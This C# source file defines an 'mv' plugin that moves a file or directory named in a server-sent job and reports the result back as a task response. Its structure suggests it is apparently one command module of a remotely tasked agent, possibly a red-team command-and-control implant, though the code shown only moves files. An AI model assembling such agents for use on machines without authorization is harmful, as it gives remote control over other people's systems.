
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "mv";
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.tokenManager = context.TokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (args.ContainsKey("source") && args.ContainsKey("destination"))
            {
                try
                {
                    FileAttributes attr = File.GetAttributes((args["source"]).Replace("\"", ""));

                    // Check if Directory
                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        DebugLog.Log($"{Name} moving directory '{args["source"]}' -> '{args["destination"]}' [{job.task.id}]");
                        Directory.Move((args["source"]).Replace("\"", ""), (args["destination"]).Replace("\"", ""));
                    }
                    else
                    {
                        DebugLog.Log($"{Name} moving file '{args["source"]}' -> '{args["destination"]}' [{job.task.id}]");
                        File.Move((args["source"]).Replace("\"", ""), (args["destination"]).Replace("\"", ""));
                    }

                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        completed = true,
                        user_output = $"Moved {(args["source"]).Replace("\"", "")} to {(args["destination"]).Replace("\"", "")}",
                        task_id = job.task.id,
                    });
                }
                catch (Exception e)
                {
                    DebugLog.Log($"{Name} exception: {e.Message} [{job.task.id}]");
                    messageManager.Write(e.ToString(), job.task.id, true, "error");
                    return;
                }
            }
            else
            {
                DebugLog.Log($"{Name} missing source or destination param [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Missing Parameter",
                    task_id = job.task.id,
                });
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
